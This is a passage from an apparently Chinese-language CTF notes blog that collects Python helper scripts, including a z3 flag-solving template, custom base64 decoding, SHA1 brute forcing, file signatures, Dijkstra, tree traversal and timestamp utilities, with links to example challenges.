class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m:<br>        solution = <span class="hljs-string">f&quot;Or((<span class="hljs-subst">&#123;i&#125;</span> != <span class="hljs-subst">&#123;m[i]&#125;</span>), <span class="hljs-subst">&#123;solution&#125;</span>)&quot;</span><br>    f2 = <span class="hljs-built_in">eval</span>(solution)<br>    s.add(f2)<br></code></pre></td></tr></table></figure><p>例题1:<a href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Reverse/EquationPy.md">EquationPy</a>。例题2(z3的BitVec的使用,可使用异或位移等操作):<a href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Crypto/ezhash.md">ezhash</a></p><p>再给出一个求解flag的模板脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>s = []<br>s_length=<span class="hljs-number">25</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(s_length):<br>    <span class="hljs-comment">#有的时候BitVec不行可以换Int，说不定能出来。前提是没有BitVec独有的操作</span><br>    byte = BitVec(<span class="hljs-string">&quot;%s&quot;</span> % i, <span class="hljs-number">8</span>)<br>    s.append(byte)<br><br>z = Solver()<br><br><span class="hljs-comment">#这里写约束</span><br><br>flag_format = <span class="hljs-string">&quot;flag&#123;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag_format)):<br>    z.add(s[i] == <span class="hljs-built_in">ord</span>(flag_format[i]))<br><br><span class="hljs-comment"># check if all chars would be ascii printable</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag_format),s_length):<br>     z.add(s[i] &gt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;!&#x27;</span>))<br>     z.add(s[i] &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;~&#x27;</span>))<br>     <br><span class="hljs-comment"># chack if the last char would be &quot;&#125;&quot;</span><br>z.add(s[-<span class="hljs-number">1</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;&#125;&#x27;</span>))<br><br><span class="hljs-comment"># check if z3 can solve it</span><br><span class="hljs-keyword">if</span> z.check() == sat:<br>    solution = z.model()<br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, s_length):<br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(solution[s[i]])))<br>    <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#Check if z3 can&#x27;t solve it</span><br><span class="hljs-keyword">elif</span> z.check() == unsat:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed:&quot;</span> + <span class="hljs-built_in">str</span>(z.check()))<br></code></pre></td></tr></table></figure><ul><li><a href="https://meashiri.github.io/ctf-writeups/posts/202307-cryptoctf/#blue-office">https://meashiri.github.io/ctf-writeups/posts/202307-cryptoctf/#blue-office</a> ：Extract函数使用. <code>Extract(high, low, expr)</code>:<ul><li>high is the index of the highest bit to extract.</li><li>low is the index of the lowest bit to extract.</li><li>expr is the expression from which the bits are to be extracted.</li></ul></li></ul><h2 id="python3实现换表base64解密"><a href="#python3实现换表base64解密" class="headerlink" title="python3实现换表base64解密"></a>python3实现换表base64解密</h2><p>此脚本为题目<a href="https://adworld.xctf.org.cn/challenges/details?hash=ebe1d9bb-662e-4922-a257-828d58e2a4aa_2&task_category_id=6">easyjni</a>的解题脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br>data=<span class="hljs-built_in">list</span>(<span class="hljs-string">&#x27;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&#x27;</span>)<br>index=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(data),<span class="hljs-number">2</span>):<br>data[i],data[i+<span class="hljs-number">1</span>]=data[i+<span class="hljs-number">1</span>],data[i]<br>flag=<span class="hljs-string">&#x27;&#x27;</span>.join(data[<span class="hljs-number">16</span>:]+data[:<span class="hljs-number">16</span>])<br>STANDARD_ALPHABET = <span class="hljs-string">b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>CUSTOM_ALPHABET = <span class="hljs-string">b&#x27;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN&#x27;</span><br>DECODE_TRANS = <span class="hljs-built_in">bytes</span>.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)<br><span class="hljs-built_in">print</span>(b64decode(flag.translate(DECODE_TRANS)))<br></code></pre></td></tr></table></figure><p>换表后题目给出的字符不全就要用itertools爆破，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">import</span> itertools<br>cipher=<span class="hljs-string">b&#x27;MyLkTaP3FaA7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD==&#x27;</span><br>STANDARD_ALPHABET = <span class="hljs-string">b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.permutations(<span class="hljs-string">b&quot;ju34&quot;</span>,<span class="hljs-number">4</span>):<br>    s=<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(j) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i])<br>    CUSTOM_ALPHABET = <span class="hljs-string">b&#x27;JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs&#x27;</span>+s.encode()+<span class="hljs-string">b&#x27;kxyz012789+/&#x27;</span><br>    DECODE_TRANS = <span class="hljs-built_in">bytes</span>.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)<br>    <span class="hljs-built_in">print</span>(b64decode(cipher.translate(DECODE_TRANS)))<br></code></pre></td></tr></table></figure><p>例题：<a href="https://buuoj.cn/challenges#[WUSTCTF2020]B@se">[WUSTCTF2020]B@se</a></p><h2 id="python爆破sha1值"><a href="#python爆破sha1值" class="headerlink" title="python爆破sha1值"></a>python爆破sha1值</h2><p><a href="https://blog.csdn.net/qq_42967398/article/details/96492843">来源</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>flag = <span class="hljs-string">&quot;@DBApp&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000</span>,<span class="hljs-number">999999</span>):<br>s = <span class="hljs-built_in">str</span>(i)+flag<br>x = hashlib.sha1(s.encode())<br>cnt = x.hexdigest()<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;6e32d0943418c2c&quot;</span> <span class="hljs-keyword">in</span> cnt:<br><span class="hljs-built_in">print</span>(cnt)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(i)+flag)<br></code></pre></td></tr></table></figure><h2 id="常见文件文件头、文件尾"><a href="#常见文件文件头、文件尾" class="headerlink" title="常见文件文件头、文件尾"></a>常见文件文件头、文件尾</h2><p><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">链接</a></p><p>补充：</p><ul><li>RAR文件尾：C4 3D 7B 00 40 07 00</li><li>jpg文件尾：FF D9</li><li>encrypto加密软件加密文件的文件头：4D 50 45 31(MPE1)，后缀.crypto</li><li><a href="https://github.com/marcobellaccini/pyAesCrypt">pyAesCrypt</a>模块密文文件：41 45 53 02。提供一个解密脚本：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyAesCrypt<br>buffersize=<span class="hljs-number">0</span><br>password=<span class="hljs-string">&#x27;&#x27;</span><br>pyAesCrypt.decryptFile(<span class="hljs-string">&quot;cipher.enc&quot;</span>,<span class="hljs-string">&quot;plain&quot;</span>,password,buffersize)<br></code></pre></td></tr></table></figure><ul><li>png文件尾:AE 42 60 82</li><li>rec后缀文件，文件头<code>AMR#</code>,strings这类文件可得到<a href="https://automacrorecorder.com/">Auto Mouse Recorder</a>。可以用官网下载软件播放该文件</li><li><a href="https://github.com/M0R1AR7Y/Writeups/tree/main/MAPNA%202024/JigBoy">JigBoy</a><ul><li>JBIG（后缀<code>jbg</code>,<code>jbg2</code>）文件头：<code>97 4A 42 32 0D 0A 1A 0A</code></li><li>其他wp： <a href="https://github.com/Jonnen98cool/CTF_writeups/blob/main/mapna_ctf_2024/JigBoy.md">https://github.com/Jonnen98cool/CTF_writeups/blob/main/mapna_ctf_2024/JigBoy.md</a></li></ul></li><li><a href="https://github.com/Apzyte-Gamer/MapnaCTF-2024/tree/main/Forensics/XXG">XXG</a><ul><li>gimp xcf文件分析。注意xcf文件的版本过高也会导致文件无法打开。一般用的是v011</li><li>详细文件头格式参考 <a href="https://developer.gimp.org/core/standards/xcf/#header">https://developer.gimp.org/core/standards/xcf/#header</a></li></ul></li><li>MFT文件头：<code>FILE0</code></li></ul><h2 id="C语言格式化字符串参考"><a href="#C语言格式化字符串参考" class="headerlink" title="C语言格式化字符串参考"></a>C语言格式化字符串参考</h2><p><a href="https://blog.csdn.net/chenmozhe22/article/details/109738852">链接</a></p><h2 id="serpent分组加密算法"><a href="#serpent分组加密算法" class="headerlink" title="serpent分组加密算法"></a>serpent分组加密算法</h2><p>详情见大佬<a href="https://blog.csdn.net/douqingl/article/details/50256931">博客</a>。可使用<a href="https://www.tools4noobs.com/online_tools/decrypt/">在线网站</a>直接解密。</p><h2 id="exif查看"><a href="#exif查看" class="headerlink" title="exif查看"></a>exif查看</h2><p>misc或者osint题型中，可能会有信息藏在exif头中。使用<a href="https://exif.tools/upload.php">在线工具</a>查看。</p><h2 id="dijkstra最短路径寻路算法"><a href="#dijkstra最短路径寻路算法" class="headerlink" title="dijkstra最短路径寻路算法"></a>dijkstra最短路径寻路算法</h2><p>例题：<a href="https://buuoj.cn/challenges#%E6%95%91%E4%B8%96%E6%8D%B7%E5%BE%84">救世捷径</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#dijkstra算法</span><br>graph=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>):<br>    graph.append([])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>):<br>        graph[i].append(<span class="hljs-number">0x3f3f3f</span>)<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dj.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).readlines()<span class="hljs-comment">#这里需要手动将原文中的最后一行换行给去掉</span><br>li=[]<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> f:<br>    li.append(x.strip().split(<span class="hljs-string">&#x27; &#x27;</span>))<br><span class="hljs-comment">#print(li)</span><br><span class="hljs-comment">#print(graph)</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> li:<br>    graph[<span class="hljs-built_in">int</span>(x[<span class="hljs-number">0</span>])][<span class="hljs-built_in">int</span>(x[<span class="hljs-number">1</span>])]=<span class="hljs-built_in">int</span>(x[<span class="hljs-number">2</span>])<br>    graph[<span class="hljs-built_in">int</span>(x[<span class="hljs-number">1</span>])][<span class="hljs-built_in">int</span>(x[<span class="hljs-number">0</span>])]=<span class="hljs-built_in">int</span>(x[<span class="hljs-number">2</span>])<br><span class="hljs-comment">#print(graph)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dijkstra</span>():<br>    dv=[<span class="hljs-number">0x3f3f3f</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>)]<span class="hljs-comment">#点i到起点1的最短距离</span><br>    route=[<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>)]<span class="hljs-comment">#记录每点和与它对应的上一点</span><br>    vis=[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">27</span>)]<span class="hljs-comment">#各点到起点的最短距离是否已定.</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">27</span>):<br>        dv[i]=graph[i][<span class="hljs-number">1</span>]<br>    dv[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span><br>    <span class="hljs-comment">#print(dv)</span><br>    vis[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>        minn=<span class="hljs-number">0x3f3f3f</span><br>        temp=-<span class="hljs-number">1</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">27</span>):<br>            <span class="hljs-keyword">if</span> vis[j]==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> minn&gt;dv[j]:<br>                minn=dv[j]<br>                temp=j<br>        vis[temp]=<span class="hljs-number">1</span><br>        <span class="hljs-comment">#print(temp)</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">27</span>):<br>            <span class="hljs-keyword">if</span> dv[j]&gt;dv[temp]+graph[temp][j]:<br>                dv[j]=dv[temp]+graph[temp][j]<br>                route[j]=temp<br>    <span class="hljs-keyword">return</span> (route,dv)<br>route,dv=dijkstra()<br><span class="hljs-built_in">print</span>(dv[<span class="hljs-number">26</span>])<br><span class="hljs-built_in">print</span>(route)<br>y=<span class="hljs-number">26</span><br><span class="hljs-keyword">while</span> y!=<span class="hljs-number">1</span>:<br>    <span class="hljs-built_in">print</span>(y)<span class="hljs-comment">#这里输出路径</span><br>    y=route[y]<br></code></pre></td></tr></table></figure><h2 id="多重base编码解密脚本"><a href="#多重base编码解密脚本" class="headerlink" title="多重base编码解密脚本"></a>多重base编码解密脚本</h2><p>有时候会遇到base编码疯狂套娃，手动放工具里都要点击解密很多次，不如直接脚本自动化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span> (<span class="hljs-string">r&#x27;flag_encode.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">try</span> :<br>                a=base64.b64decode(a).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">try</span>:<br>                a=base64.b32decode(a).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">try</span>:<br>                a=base64.b16decode(a).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">in</span> a:<br>                <span class="hljs-built_in">print</span> (a)<br>                <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="字频统计脚本"><a href="#字频统计脚本" class="headerlink" title="字频统计脚本"></a>字频统计脚本</h2><p><a href="https://blog.csdn.net/mochu7777777/article/details/109377328">来源</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">alphabet = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span><br>strings = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>).read()<br><br>result = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> alphabet:<br>counts = strings.count(i)<br>i = <span class="hljs-string">&#x27;&#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i)<br>result[i] = counts<br><br>res = <span class="hljs-built_in">sorted</span>(result.items(),key=<span class="hljs-keyword">lambda</span> item:item[<span class="hljs-number">1</span>],reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> res:<br><span class="hljs-built_in">print</span>(data)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>flag = <span class="hljs-built_in">str</span>(i[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(flag[<span class="hljs-number">0</span>],end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="二叉树遍历"><a href="#二叉树遍历" class="headerlink" title="二叉树遍历"></a>二叉树遍历</h2><h3 id="根据中序-后序遍历结果获取先序遍历结果"><a href="#根据中序-后序遍历结果获取先序遍历结果" class="headerlink" title="根据中序+后序遍历结果获取先序遍历结果"></a>根据中序+后序遍历结果获取先序遍历结果</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ToPreOrder</span>(<span class="hljs-params">Postorder,Inorder</span>):<br>    length = <span class="hljs-built_in">len</span>(Postorder)<br>    <span class="hljs-keyword">if</span> length == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    root = Postorder[length-<span class="hljs-number">1</span>] <span class="hljs-comment">#根节点　</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<span class="hljs-comment">#找到中序遍历中根节点的位序</span><br>        <span class="hljs-keyword">if</span> root == Inorder[i]:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(root,end=<span class="hljs-string">&quot;&quot;</span>)<br>    ToPreOrder(Postorder[<span class="hljs-number">0</span>:i],Inorder[<span class="hljs-number">0</span>:i]) <span class="hljs-comment">#递归，传入左子树的后序和中序遍历序列</span><br>    ToPreOrder(Postorder[i:length-<span class="hljs-number">1</span>],Inorder[i+<span class="hljs-number">1</span>:length])<span class="hljs-comment">#递归，传入右子树的后序和中序遍历序列</span><br></code></pre></td></tr></table></figure><h3 id="根据前序-中序遍历结果获取后序遍历结果"><a href="#根据前序-中序遍历结果获取后序遍历结果" class="headerlink" title="根据前序+中序遍历结果获取后序遍历结果"></a>根据前序+中序遍历结果获取后序遍历结果</h3><p><a href="https://blog.csdn.net/ao52426055/article/details/110420027">例题及来源</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_after_deep</span>(<span class="hljs-params">pre, mid, a</span>):<span class="hljs-comment">#已知前中，求后，a就是后序</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pre) == <span class="hljs-number">1</span>:<br>        a.append(pre[<span class="hljs-number">0</span>])<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pre) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span><br>    root = pre[<span class="hljs-number">0</span>]<br>    root_index = mid.index(root)<br>    get_after_deep(pre[<span class="hljs-number">1</span>:root_index+<span class="hljs-number">1</span>], mid[:root_index], a)<br>    get_after_deep(pre[root_index+<span class="hljs-number">1</span>:], mid[root_index+<span class="hljs-number">1</span>:], a)<br>    a.append(root)<br>    <span class="hljs-keyword">return</span> a<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_hou</span>():<br>    pre=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请依次输入前序遍历、中序遍历的结果，以换行分割:\n&quot;</span>)<br>    mid=<span class="hljs-built_in">input</span>()<br>    pre_list=<span class="hljs-built_in">list</span>(pre)<br>    mid_list=<span class="hljs-built_in">list</span>(mid)<br>    a=[]<br>    res_list=get_after_deep(pre,mid,a)<br>    res=<span class="hljs-string">&quot;&quot;</span>.join(res_list)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;后序遍历为:&quot;</span>,res)<br>get_hou()<br></code></pre></td></tr></table></figure><p>例题:<a href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Reverse/%5BWUSTCTF2020%5Dlevel4.md">[WUSTCTF2020]level4</a></p><h2 id="python时间戳相关-获取文件访问-创建-修改时间"><a href="#python时间戳相关-获取文件访问-创建-修改时间" class="headerlink" title="python时间戳相关+获取文件访问&#x2F;创建&#x2F;修改时间"></a>python时间戳相关+获取文件访问&#x2F;创建&#x2F;修改时间</h2><p><a href="https://www.cnblogs.com/shaosks/p/5614630.html">来源</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-string">&#x27;&#x27;&#x27;把时间戳转化为时间: 1479264792 to 2016-11-16 10:53:12&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">TimeStampToTime</span>(<span class="hljs-params">timestamp</span>):<br>timeStruct = time.localtime(timestamp)<br><span class="hljs-keyword">return</span> time.strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,timeStruct)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">time_to_time_stamp</span>(<span class="hljs-params">str_time</span>):<br>    dt = datetime.strptime(str_time, <span class="hljs-string">&#x27;%Y-%m-%d %H:%M&#x27;</span>)<br>    <span class="hljs-keyword">return</span> dt.timestamp()<br><span class="hljs-string">&#x27;&#x27;&#x27;获取文件的大小,结果保留两位小数，单位为MB&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_FileSize</span>(<span class="hljs-params">filePath</span>):<br>fsize = os.path.getsize(filePath)<br>fsize = fsize/<span class="hljs-built_in">float</span>(<span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">round</span>(fsize,<span class="hljs-number">2</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;获取文件的访问时间&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_FileAccessTime</span>(<span class="hljs-params">filePath</span>):<br>t = os.path.getatime(filePath)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;时间戳:<span class="hljs-subst">&#123;t&#125;</span>\n时间:<span class="hljs-subst">&#123;TimeStampToTime(t)&#125;</span>&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;获取文件的创建时间&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_FileCreateTime</span>(<span class="hljs-params">filePath</span>):<br>t = os.path.getctime(filePath)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;时间戳:<span class="hljs-subst">&#123;t&#125;</span>\n时间:<span class="hljs-subst">&#123;TimeStampToTime(t)&#125;</span>&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;获取文件的修改时间&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title 